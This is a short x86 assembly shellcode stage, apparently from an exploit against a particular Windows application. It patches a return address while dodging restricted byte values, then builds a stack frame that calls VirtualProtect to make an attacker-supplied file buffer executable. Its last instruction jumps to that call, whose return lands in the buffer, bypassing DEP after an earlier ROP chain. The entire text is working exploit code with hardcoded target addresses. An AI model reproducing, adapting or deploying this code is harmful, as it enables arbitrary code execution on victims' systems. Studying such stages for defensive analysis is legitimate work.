[bits 32]
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Initialization: Prep ESP fixes                                       ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
mov eax,esp			;; save current esp
sub eax,0xFFFFFEFC	;; position at location of return addr
xor ecx,ecx
sub ecx,0xFFFFFFFC	;; set ecx == 0x04
sub eax,ecx			;; required as we cannot use `sub eax,0xFFFFFF00`
xor ecx,ecx			;; zero out ecx
mov ecx,0xD2D2D2D2	;; set ecx up to 0x00435DBA
sub ecx,0xD28F7518	;; ecx == 0x00435DBA (return address)
mov dword [eax],ecx	;; set up the return address in target ESP

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Bootstrap: VirtualProtect and JMP to file contents                   ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Ref to current file sits at esp - 0x3D8
;; file contents are completely loaded here, no limitations on characters.
;; 100% free to run code.

;; 1. fetch VirtualProtect function pointer into EBX
;; during ROP, this was stored at 0x67BD0324
mov ebx,0x67BD0324	;; pointer to the VirtualProtect function
mov ebx,dword [ebx]	;; fetch the function address

;; 2. fetch file start address into EDX
xor edx,edx			;; clear edx
mov edx,esp			;; get esp into edx
add edx,0xFFFFFC28	;; esp - 0x3D8
mov edx,dword [edx]	;; follow pointer
xor ecx,ecx			;; clear ecx
sub ecx,0xFFFFFFFC	;; set ecx == 0x04
add edx,ecx			;; required as we cannot use `add edx,0x04`
mov edx,dword [edx]	;; follow pointer

;; 3. setup stack
xor ecx,ecx
xor esi,esi
sub ecx,0xFFFFFFFC				;; set ecx == 0x04
mov dword [esp],eax				;; pseudo-push eax
sub esp,ecx						;; next stack entry
mov dword [esp],0x67BD0334		;; lpflOldProtect
sub esp,ecx						;; next stack entry
sub esi,0xFFFFFFC0				;; set esi == 0x40
mov dword [esp],esi				;; flNewProtect
sub esp,ecx						;; next stack entry
imul esi,esi,0x10				;; set esi == 0x400
mov dword [esp],esi				;; dwSize
sub esp,ecx						;; next stack entry
mov dword [esp],edx				;; lpAddress
sub esp,ecx						;; next stack entry
mov dword [esp],edx				;; return address
jmp ebx							;; call VirtualProtect
